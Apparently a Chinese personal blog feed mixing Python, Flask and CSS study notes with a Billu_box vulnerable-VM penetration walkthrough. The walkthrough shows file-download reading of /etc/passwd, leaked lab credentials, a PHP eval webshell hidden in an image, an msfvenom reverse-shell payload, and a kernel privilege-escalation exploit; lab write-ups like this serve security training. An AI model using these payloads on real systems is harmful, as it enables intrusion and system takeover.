href="#3-映射的弹性键查询" class="headerlink" title="3.映射的弹性键查询"></a>3.映射的弹性键查询</h2><h2 id="4-字典的变种"><a href="#4-字典的变种" class="headerlink" title="4.字典的变种"></a>4.字典的变种</h2><p>collections.OrdereDict</p><p>子类化UserDict</p><h2 id="5-集合"><a href="#5-集合" class="headerlink" title="5.集合"></a>5.集合</h2><p>集合推导</p><h2 id="6-字典中的散列表"><a href="#6-字典中的散列表" class="headerlink" title="6.字典中的散列表"></a>6.字典中的散列表</h2><p> 散列表是一个稀疏数组，大概三分之一的空间是空的</p><p>内置的hash用于所有的内置类型的对象，且如果两个对象在比较的时候是相等的，那它们的散列值必须是相等的，否则散列表就不能正常的运行。如1==1.0返回true，那么hash(1)==hash(1.0)必须为真。</p><p>散列表算法：</p><p>获取my_dict[search_key]背后值，python首先会调用hash(search_key)来计算search_key的散列值，</p><p><img src="/.com//Typora/流畅的Python学习笔记/1563271134377.png" alt="1563271134377"></p><h2 id="7-字典的实现及其导致的结果"><a href="#7-字典的实现及其导致的结果" class="headerlink" title="7.字典的实现及其导致的结果"></a>7.字典的实现及其导致的结果</h2><p>键必须是可散列的，可散列指的是:</p><ol><li>支持hash()函数，通过 <code>__hash_()</code>方法所得到的散列值是不变的</li><li>支持<code>__eq__（）</code>方法检测相等性</li><li>若a==b为真，则hash(a)==hash(b)也为真。</li></ol><p>字典的劣势:</p><p>字典在内存上的开销比较大，可以用具名元祖来代替字典。<code>__slots_</code>可以改变实例属性的存储方式，由dict变成tuple.</p><p>键的次序取决于添加顺序</p><p>字典添加新建可能改变已有键的顺序</p><h2 id="8-集合的实现以及导致的结果"><a href="#8-集合的实现以及导致的结果" class="headerlink" title="8.集合的实现以及导致的结果"></a>8.集合的实现以及导致的结果</h2><p>散列表存放的是元素的引用。</p><p>集合里面的元素必须是可散列的，集合很消耗内存，可以很高效的判断元素是否是存在于集合</p><p>元素的次序取决于被添加到集合里的次序</p><p>往集合里面添加元素，可能会改变集合里已有元素的次序</p><h1 id="第四章-文本和字节序列"><a href="#第四章-文本和字节序列" class="headerlink" title="第四章 文本和字节序列"></a>第四章 文本和字节序列</h1><h2 id="1-字符问题"><a href="#1-字符问题" class="headerlink" title="1.字符问题"></a>1.字符问题</h2><p><strong>编码</strong>: 字符串的unicode 码位变成用于存储以及传输的字节形式</p><p><strong>解码</strong>：就是将字节转化位人类可以看到的字符串。</p><h2 id="2-字节概要"><a href="#2-字节概要" class="headerlink" title="2.字节概要"></a>2.字节概要</h2><p>bytes和bytearray的切片仍然是一个切片，元素是一个十进制的数，str[0]==str[:1]，但是bytes[:1]!=bytes[0].</p><h2 id="3-编程中的编码问题"><a href="#3-编程中的编码问题" class="headerlink" title="3.编程中的编码问题"></a>3.编程中的编码问题</h2><h3 id="3-1-编码为字节的问题"><a href="#3-1-编码为字节的问题" class="headerlink" title="3.1 编码为字节的问题"></a>3.1 编码为字节的问题</h3><p>encode中使用errors参数，指定位ignore将忽略这个不能编码的错误</p><p>使用replace将会用?来代替不能编码的字符</p><p>使用xmlcharrefreplace将会用xml实体来代替不可编码的字符</p><h3 id="3-2-解码中的问题"><a href="#3-2-解码中的问题" class="headerlink" title="3.2 解码中的问题"></a>3.2 解码中的问题</h3><p><code>octets.decode(&#39;utf_8&#39;, errors=&#39;replace&#39;)</code> </p><h3 id="3-3-使用预期之外的编码加载模块时抛出的syntaxerror"><a href="#3-3-使用预期之外的编码加载模块时抛出的syntaxerror" class="headerlink" title="3.3 使用预期之外的编码加载模块时抛出的syntaxerror"></a>3.3 使用预期之外的编码加载模块时抛出的syntaxerror</h3><p><code># coding: cp1252</code></p><h3 id="3-4如何找出字节序列的编码"><a href="#3-4如何找出字节序列的编码" class="headerlink" title="3.4如何找出字节序列的编码"></a>3.4如何找出字节序列的编码</h3><p>假如有个文本文件，里面保存的是源码或诗句，但是你不知道它的编码。如何查明真正的编码呢？</p><p>统一字符编码侦测包Chardet（<a href="https://pypi.python.org/pypi/chardet）就是这样工作的，它能识别所支持的30" target="_blank" rel="noopener">https://pypi.python.org/pypi/chardet）就是这样工作的，它能识别所支持的30</a> 种编码。Chardet 是一个Python 库，<br>可以在程序中使用，不过它也提供了命令行工具chardetect。下面是它对本章书稿文件的检测报告：</p><h3 id="3-5-python处理文本文件"><a href="#3-5-python处理文本文件" class="headerlink" title="3.5 python处理文本文件"></a>3.5 python处理文本文件</h3><p>python中的默认文本编码：</p><ol><li>文本文件默认使用locale.getpreferredencoding()，如果打开文件时没有指定encoding 参数，默认值由<br>locale.getpreferredencoding() 提供。</li><li>如果设定了PYTHONIOENCODING 环境变量（<a href="https://docs.python.org/3/using/cmdline.html#envvarPYTHONIOENCODING），sys.stdout/stdin/stderr" target="_blank" rel="noopener">https://docs.python.org/3/using/cmdline.html#envvarPYTHONIOENCODING），sys.stdout/stdin/stderr</a> 的编码使用设定的值；否则，继承自所在的控制台；如果输入/ 输出重定向到文件，则由locale.getpreferredencoding() 定义</li><li>Python 在二进制数据和字符串之间转换时，内部使用sys.getdefaultencoding() 获得的编码；</li><li>sys.getfilesystemencoding() 用于编解码文件名</li><li>locale.getpreferredencoding() 返回的编码是最重要的：这是打开文件的默认编码，也是重定向到文件的sys.stdout/stdin/stderr 的默认编码</li></ol><h2 id="第五章-一等对象函数"><a href="#第五章-一等对象函数" class="headerlink" title="第五章 一等对象函数"></a>第五章 一等对象函数</h2><p>在python中，函数是一等对象。一等对象具有以下的特性：</p><ul><li>在运行时创建</li><li>能赋值给变量或数据结构中的元素</li><li>能作为参数传给函数</li><li>能作为函数的返回结果</li></ul><h3 id="1-高阶函数"><a href="#1-高阶函数" class="headerlink" title="1 高阶函数"></a>1 高阶函数</h3><ol><li><strong>定义：</strong>接受函数为参数，或者把函数作为结果返回的函数是高阶函数</li></ol><p>python3中的高阶函数:最为人熟知的高阶函数有<strong>map</strong>、<strong>filter</strong>、<strong>reduce</strong>.</p><p><strong>map</strong>和<strong>filter</strong>可以使用列表推导式或者使用生成器表达式代替，避免了匿名函数，<strong>reduce</strong>是用来求和的函数，使用<strong>sum</strong>代替了</p><p>all(iterable):如果iterable 的每个元素都是真值，返回True；all([]) 返回True.</p><p>any(iterable): 只要iterable 中有元素是真值，就返回True；any([]) 返回False。</p><h3 id="2-匿名函数"><a href="#2-匿名函数" class="headerlink" title="2.匿名函数"></a>2.匿名函数</h3><p>lambda 函数的定义体中不能赋值，也不能使用while和try 等Python 语句</p><h3 id="3-可调用对象"><a href="#3-可调用对象" class="headerlink" title="3.可调用对象"></a>3.可调用对象</h3><ul><li>用户定义的函数</li><li>内置函数</li><li>在类的定义体中定义的函数</li><li>调用类时会运行类的<code>__new__</code> 方法创建一个实例，然后运行<br><code>__init__</code> 方法，初始化实例，最后把实例返回给调用方</li><li>类的实例：类定义了<strong>call</strong> 方法，那么它的实例可以作为函数调用。</li><li>生成器函数。使用yield 关键字的函数或方法。调用生成器函数返回的是生成器对象。</li></ul><p>判断一个对象是否是可调用使用:Python 中有各种各样可调用的类型，因此判断对象能否调用，最安<br>全的方法是使用内置的<strong>callable()</strong> 函数</p><h3 id="4-用户自定义的可调用类型"><a href="#4-用户自定义的可调用类型" class="headerlink" title="4.用户自定义的可调用类型"></a>4.用户自定义的可调用类型</h3><p>实现类的<strong>call</strong>的特殊方法，就能将类实现函数式调用。</p><h3 id="5-函数内省"><a href="#5-函数内省" class="headerlink" title="5.函数内省"></a>5.函数内省</h3><p>把函数视作对象特有的特性。dir 函数可以探知函数具有下述属性：</p><p>函数对象的特殊方法：</p><ul><li><code>__dict__</code></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Billu_box靶机渗透</title>
      <link href="/2019/07/14/billu-box-ba-ji-shen-tou/"/>
      <url>/2019/07/14/billu-box-ba-ji-shen-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>靶机环境为<strong>Ubuntu(32)+php+mysql+apachem,</strong>攻击机为<strong>kali linux.</strong>  目标主机ip（192.168.188.140），kali ip(192.168.188.139)</p><hr><h2 id="1-扫描存活主机"><a href="#1-扫描存活主机" class="headerlink" title="1.扫描存活主机"></a>1.扫描存活主机</h2><p>使用arp-scan扫描本地存活主机</p><p> <img src="/.com//1563073977625.png" alt="1563073977625"></p><hr><h2 id="2-使用SPARTA工具进行端口、服务以及Nikto扫描"><a href="#2-使用SPARTA工具进行端口、服务以及Nikto扫描" class="headerlink" title="2.使用SPARTA工具进行端口、服务以及Nikto扫描"></a>2.使用SPARTA工具进行端口、服务以及Nikto扫描</h2><p><img src="/.com//1563074239538.png" alt="1563074239538"></p><p>发现目标主机只存在两个端口开放，nikto进行的漏洞扫描结果</p><p><img src="/.com//1563074407277.png" alt="1563074407277"></p><p>根据扫描结果发现有一个phpinfo的信息泄露。打开<strong>192.168.188.140/in.php</strong>,收集一些敏感信息。</p><ul><li>php版本为5.3.10》5.3.4，这个版本不能使用00截断进行文件包含</li><li>网站的根目录是<strong>/var/www</strong>,如果存在sql注入且是root权限可以直接将shell写入网站目录中。</li><li>mysql的版本是5.5.38</li><li>session的存储路径是<strong>/var/lib/php5</strong></li></ul><hr><h2 id="3-使用dirbuster进行目录枚举"><a href="#3-使用dirbuster进行目录枚举" class="headerlink" title="3.使用dirbuster进行目录枚举"></a>3.使用dirbuster进行目录枚举</h2><p><img src="/.com//1563075621237.png" alt="1563075621237"></p><p>根据dirbuster的目录爆破，可以发现in.php,add.php,show.php,panel.php、test.php等。</p><h2 id="4-使用dirb进行目录枚举"><a href="#4-使用dirb进行目录枚举" class="headerlink" title="4.使用dirb进行目录枚举"></a>4.使用dirb进行目录枚举</h2><p><code>dirb http://192.168.188.140 /usr/share/dirb/wordlists/big.txt -o 192.168.188.140.txt</code></p><hr><h1 id="0x02-漏洞挖掘"><a href="#0x02-漏洞挖掘" class="headerlink" title="0x02 漏洞挖掘"></a>0x02 漏洞挖掘</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>访问首页，发现登录框，使用万能密码注入：用户名输入:<code>admin&#39;or &#39;1&#39;=&#39;1#</code>,密码随意输入字符串，注入无效，try again,使用burpsuit抓包，发送到sqlmap跑post注入无果，加载所有的temper没用，此处不知道网站是如何过滤的，暂时放弃注入</p><h2 id="2-任意文件下载"><a href="#2-任意文件下载" class="headerlink" title="2.任意文件下载"></a>2.任意文件下载</h2><p>访问192.168.188.140/test.php，网页提示需要file的参数，尝试url添加<strong>file=in.php</strong>，依然提示需要file参数，尝试使用post提交，hackbar</p><p><img src="/.com//1563076372312.png" alt="1563076372312"></p><p>提交发现可以下载in.php，此处存在任意文件下载漏洞。接下来，将网站我们可以探测到的php文件下载到本地，同时也可以在linux下的一些敏感文件 <strong>/etc/passwd</strong>,<strong>/etc/shodow</strong>,</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:103:106::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:104:107::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">landscape:x:105:110::/var/lib/landscape:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</span><br></pre></td></tr></table></figure><p>上面可知通过ica账户和root就可以使用ssh登录</p><h2 id="3-代码审计"><a href="#3-代码审计" class="headerlink" title="3.代码审计"></a>3.代码审计</h2><h3 id="1-尝试绕过sql注入"><a href="#1-尝试绕过sql注入" class="headerlink" title="1.尝试绕过sql注入"></a>1.尝试绕过sql注入</h3><p>下载首页，include了一个c.php，下载c.php，发现是数据库连接文件，找到数据库的连接用户名和密码：billu，b0x_billu</p><p><code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p><p>尝试使用这个密码登录首页，有时候数据库的连接密码和管理员使用的账号密码一致，尝试登录失败。    </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   $uname=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'un'</span>]));</span><br><span class="line">$pass=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'ps'</span>]));</span><br><span class="line">$run=<span class="string">'select * from auth where  pass=\''</span>.$pass.<span class="string">'\' and uname=\''</span>.$uname.<span class="string">'\''</span>;</span><br><span class="line">$result = mysqli_query($conn, $run);</span><br></pre></td></tr></table></figure><p>无法闭合单引号，个人觉得sql注入无法使用，除非开启gpc。再审计panel.php。</p><h3 id="2-枚举出phpmyadmin文件读取配置文件"><a href="#2-枚举出phpmyadmin文件读取配置文件" class="headerlink" title="2.枚举出phpmyadmin文件读取配置文件"></a>2.枚举出phpmyadmin文件读取配置文件</h3><p>此时查看扫描的目录还有什么信息可以被利用，可以看到dirb爆破出了phpmyadmin的目录，</p><p><img src="/.com//1563086043272.png" alt="1563086043272"></p><p>接下来我们使用任意文件下载漏洞读取phpmyadmin的默认配置文件config.inc.php。下载后可以发现root的账号和密码</p><p><img src="/.com//1563086737885.png" alt="1563086737885"></p><p>使用xshell进行连接，发现已经是root用户！</p><h3 id="3-登录phpmyadmin后台getshell"><a href="#3-登录phpmyadmin后台getshell" class="headerlink" title="3.登录phpmyadmin后台getshell"></a>3.登录phpmyadmin后台getshell</h3><p>使用root:roottoor登录，失败，使用billu，b0x_billu登录成功，查看是否拥有写入文件权限:</p><p><code>SHOW  GLOBAL  VARIABLES  LIKE  &#39;%secure%&#39;</code>,当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p><p>发现可以写入任意位置，根据phpinfo的信息得到路径，然后插入一句话</p><p><img src="/.com//1563087305732.png" alt="1563087305732"></p><p>失败，权限不够没办法getshell.</p><h3 id="4-读取登录账号密码找上传"><a href="#4-读取登录账号密码找上传" class="headerlink" title="4.读取登录账号密码找上传"></a>4.读取登录账号密码找上传</h3><p>查看auth表得到登录用户名和密码为：</p><p>biLLu和hEx_it，尝试登录首页。接下来就是正常渗透思路，找上传点，上传shell，找到</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($r,$image))</span><br><span class="line">&#123;</span><br><span class="line">$finfo = @<span class="keyword">new</span> finfo(FILEINFO_MIME); </span><br><span class="line">$filetype = @$finfo-&gt;file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/image\/jpeg/'</span>,$filetype )  || preg_match(<span class="string">'/image\/png/'</span>,$filetype ) || preg_match(<span class="string">'/image\/gif/'</span>,$filetype ))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>], <span class="string">'uploaded_images/'</span>.$_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Uploaded successfully "</span>;</span><br><span class="line">  $update=<span class="string">'insert into users(name,address,image,id) values(\''</span>.$name.<span class="string">'\',\''</span>.$address.<span class="string">'\',\''</span>.$iname.<span class="string">'\', \''</span>.$id.<span class="string">'\')'</span>; </span><br><span class="line"> mysqli_query($conn, $update);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;i told you dear, only png,jpg and gif file are allowed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在上传点但是是白名单验证，而且没法进行截断上传版本不行，所以这个只能上传白名单的jpg等图片后缀的文件，这边思路就断了。</p><h3 id="5-使用文件包含漏洞包含图片马getshell"><a href="#5-使用文件包含漏洞包含图片马getshell" class="headerlink" title="5.使用文件包含漏洞包含图片马getshell"></a>5.使用文件包含漏洞包含图片马getshell</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'continue'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$dir=getcwd();</span><br><span class="line">$choice=str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$_POST[<span class="string">'load'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($choice===<span class="string">'add'</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($choice===<span class="string">'show'</span>)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($dir.<span class="string">'/'</span>.$_POST[<span class="string">'load'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面只是对load参数进行一个过滤，替换其中的路径遍历符号<code>./</code>为空。</p><p>上传图片马，下载jack的那个图片，末尾添加 <code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39;);?&gt;</code>,浏览器添加代理上传，</p><p><img src="/.com//1563089387620.png" alt="1563089387620"></p><p>添加continue字段，随意输入一个值，然后进行上传，返回值为success，知道上传成功，然后在phpmyadmin的上传表查找这个上传的路径。在users表中发现上传路径。</p><p><img src="/.com//1563089639133.png" alt="1563089639133"></p><p><img src="/.com//1563091267221.png" alt="1563091267221"></p><p>查看图像链接路径为<code>http://192.168.188.140/uploaded_images/jack.jpg</code>，使用文件包含这个图片getshell，hackbar，post</p><p><img src="/.com//1563090056138.png" alt="1563090056138"></p><p>使用burp抓包发现图片马没有再本地生成shell.php，应该是图片马问题，然后在本地找gif的图片，使用</p><p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.188.139  LPORT=4444 R &gt; shell.php</code></p><p>然后将其copy到windows上，在gif图片后面添加shell.php的内容，然后继续上传使用文件包含执行代码，</p><p><img src="/.com//1563093836679.png" alt="1563093836679"></p><p>成功弹回shell,</p><p><img src="/.com//1563093892255.png" alt="1563093892255"></p><h1 id="0x03-exp提权"><a href="#0x03-exp提权" class="headerlink" title="0x03 exp提权"></a>0x03 exp提权</h1><p>执行shell，切换到cmd_shell，然后使用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>弹回虚拟终端，</p><p>执行<code>uname -a</code>,查看linux内核</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@indishell:/var/www$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux indishell 3.13.0-32-generic <span class="comment">#57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>使用search_sploit查找内核版本提权漏洞，</p><p><img src="/.com//1563095497266.png" alt="1563095497266"></p><p>使用meterpreter上传exp文件，出错，发现此时是在var/www目录下，没有写入文件的权限，那么在uploaded_images存在写入文件的权限，在uploaded_images创建文件夹<code>mkdir hack</code>，然后使用切换到hack目录，使用<code>upload /usr/share/exploitdb/exploits/linux/local/37292.c</code>上传exp，修改文件权限</p><p><img src="/.com//1563105602234.png" alt="1563105602234"></p><p>然后输入<code>shell</code>进入交互shell中，然后编译 <code>gcc -o exp 37292.c</code>,</p><p><img src="/.com//1563105720749.png" alt="1563105720749"></p><p>执行exp</p><p><img src="/.com//1563105809324.png" alt="1563105809324"></p><p>成功提权。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>breach靶机渗透提权</title>
      <link href="/2019/07/10/breach-ba-ji-shen-tou-ti-quan/"/>
      <url>/2019/07/10/breach-ba-ji-shen-tou-ti-quan/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit常用插件笔记</title>
      <link href="/2019/07/10/burpsuit-chang-yong-cha-jian-bi-ji/"/>
      <url>/2019/07/10/burpsuit-chang-yong-cha-jian-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="burpsuit常用插件学习笔记"><a href="#burpsuit常用插件学习笔记" class="headerlink" title="burpsuit常用插件学习笔记"></a>burpsuit常用插件学习笔记</h1><h2 id="0x01-sqlipy"><a href="#0x01-sqlipy" class="headerlink" title="0x01 sqlipy"></a>0x01 sqlipy</h2><h3 id="sqlipy的安装"><a href="#sqlipy的安装" class="headerlink" title="sqlipy的安装"></a>sqlipy的安装</h3><p>由于sqlmap是Python语言编写的，而burp是java编写的所以需要先下载jython-standalone-2.7.0.jar文件，然后进行使用。jython是它是一个Python语言在Java中的完全实现。Jython不仅给你提供了Python的库，同时也提供了所有的Java类。</p><blockquote><p>jython-standalone-2.7.0.jar下载地址: <a href="http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar" target="_blank" rel="noopener">http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar</a></p></blockquote><p>我用的是burp2.0，下载完之后在Extender里面的options里面设置python和java的路径</p><p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562401531038.png" alt="1562401531038"></p><p>设置完路径在<img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562401557932.png" alt="1562401557932"></p><p>安装后，我们对其进行一个使用。</p><h3 id="sqlipy的使用"><a href="#sqlipy的使用" class="headerlink" title="sqlipy的使用"></a>sqlipy的使用</h3><p>首先我们打开sqlmapapi.py进行一个监听</p><p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562402286150.png" alt="1562402286150"></p><p>接下来我们对DVWA进行一个测试，打开sql注入的栏目，然后抓包，在右击鼠标将其使用sqlipy scan </p><p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562402550077.png" alt="1562402550077"></p><p>然后设置sqlmap api的相关环境路径：</p><p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562403474773.png" alt="1562403474773"></p><p>切记路径不能使用中文。</p><p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562404449423.png" alt="1562404449423"></p><p>设置sqlmap的参数，然后点击start scan 然后在sqlmap的logs可以看到注入日志。</p><p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562404503990.png" alt="1562404503990"></p><hr><h2 id="0x02-co2"><a href="#0x02-co2" class="headerlink" title="0x02  co2"></a>0x02  co2</h2><hr><p>co2也是使用sqlmap配合burpsuit的插件，但是感觉界面的设置更友好，我们在商店安装后，然后抓包，发送到send sqlmapper,点击选项卡co2，进入sqlmap注入的配置界面，</p><p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562405319297.png" alt="1562405319297"></p><p>点击config，配置sqlmap的一个路径，然后下面options就可以进行一个sqlmap选项的配置，最后点击config上面的run，就可以看到一个命令行参数运行sqlmap，这个插件比上面的插件界面更加友好，可以配置的选项很多。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2019/07/10/xin-xi-shou-ji/"/>
      <url>/2019/07/10/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>flask框架学习笔记</title>
      <link href="/2019/07/10/flask-kuang-jia-xue-xi-bi-ji/"/>
      <url>/2019/07/10/flask-kuang-jia-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-flask简介"><a href="#0x01-flask简介" class="headerlink" title="0x01 flask简介"></a>0x01 flask简介</h1><p>flask有两个依赖，一个是WSGI(web服务器网关接口)工具集，一个是<strong>WSGI(web server werkzeug)</strong>，另一个是<strong>jinja2模板引擎</strong>，flask是一个可扩展的框架。</p><p><strong>注解：WSGI(web server werkzeug)</strong>：是python用来规定web服务器如何与python web程序进行沟通的标准</p><ol><li><h5 id="简单的包管理工具介绍"><a href="#简单的包管理工具介绍" class="headerlink" title="简单的包管理工具介绍"></a>简单的包管理工具介绍</h5></li></ol><ul><li>pipenv：解决pip和virtualenv+requirements的工作方式的弊端，windows下生成的虚拟环境在Administrator.virtualenvs\目录创建，linux在local\share\virtualenvs目录创建，在项目目录中创建虚拟环境文件，可以设置变量PIPENV_VENV_IN_PROJECT变量等于1.使用<code>pipenv shell</code>激活环境`</li></ul><h1 id="0x02-flask与http请求"><a href="#0x02-flask与http请求" class="headerlink" title="0x02 flask与http请求"></a>0x02 flask与http请求</h1><h2 id="1-注册路由"><a href="#1-注册路由" class="headerlink" title="1. 注册路由"></a>1. 注册路由</h2><ul><li><strong>视图可以绑定多个URL</strong></li><li><strong>动态URL</strong>  <ul><li>app.route(“/greet/<name>“)` 如果url没有跟相应的路径就会出现404错误，可以在app.route中设置defaults字典</name></li></ul></li></ul><h2 id="2-flask-run启动内置的服务器"><a href="#2-flask-run启动内置的服务器" class="headerlink" title="2.flask run启动内置的服务器"></a>2.flask run启动内置的服务器</h2><p>需要设置flask_app环境变量指定实例所在的模块。默认寻找app或者application的py文件</p><p>使用python-dotenv来进行环境变量的管理。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀思路总结</title>
      <link href="/2019/07/01/mian-sha-si-lu-zong-jie/"/>
      <url>/2019/07/01/mian-sha-si-lu-zong-jie/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>css学习笔记</title>
      <link href="/2019/05/29/css-xue-xi-bi-ji-div-bu-ju/"/>
      <url>/2019/05/29/css-xue-xi-bi-ji-div-bu-ju/</url>
      
        <content type="html"><![CDATA[<h3 id="1-使用table布局的一些缺点"><a href="#1-使用table布局的一些缺点" class="headerlink" title="1. 使用table布局的一些缺点"></a>1. 使用table布局的一些缺点</h3><ul><li>采用表格容易出错,嵌套层级很多，一旦出现嵌套顺序错乱，整个页面达不到效果</li><li>采用表格布局页面不够灵活，动一块整个表格的布局就得变</li></ul><h3 id="2-引入css"><a href="#2-引入css" class="headerlink" title="2. 引入css"></a>2. 引入css</h3><ul><li>外部样式表：link标签</li><li>内部：style标签编写</li><li>行内：直接标签内添加style</li></ul><h3 id="3-css的块标签"><a href="#3-css的块标签" class="headerlink" title="3 . css的块标签"></a>3 . css的块标签</h3><ul><li>span 内容显示在一行</li><li>div 默认占一行，自动换行</li></ul><p>align属性</p><hr><h3 id="4-css的选择器"><a href="#4-css的选择器" class="headerlink" title="4. css的选择器"></a>4. css的选择器</h3><ul><li>元素选择器</li><li>id选择器 id必须是唯一的  #开头 js,jquery只会找到重复的id中的第一 个</li><li>类选择器： .开头</li></ul><hr><h3 id="5-CSS中的其它选择器"><a href="#5-CSS中的其它选择器" class="headerlink" title="5.  CSS中的其它选择器"></a>5.  CSS中的其它选择器</h3><ul><li><p>选择器分组: 选择器1,选择器2{ 属性的名称:属性的值}</p><ul><li><p>属性选择器:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">a[title]</span><br><span class="line">a[titile='aaa']</span><br><span class="line">a[href][title]</span><br><span class="line">a[href][title='aaa']</span><br></pre></td></tr></table></figure></li><li><p>后代选择器: 爷爷选择器  孙子选择器   找出所有的后代</p></li><li><p>子元素选择器:  父选择器  &gt; 儿子选择器</p></li><li><p>伪类选择器: 通常都是用在A标签上</p></li></ul></li></ul><hr><h3 id="5-css的浮动"><a 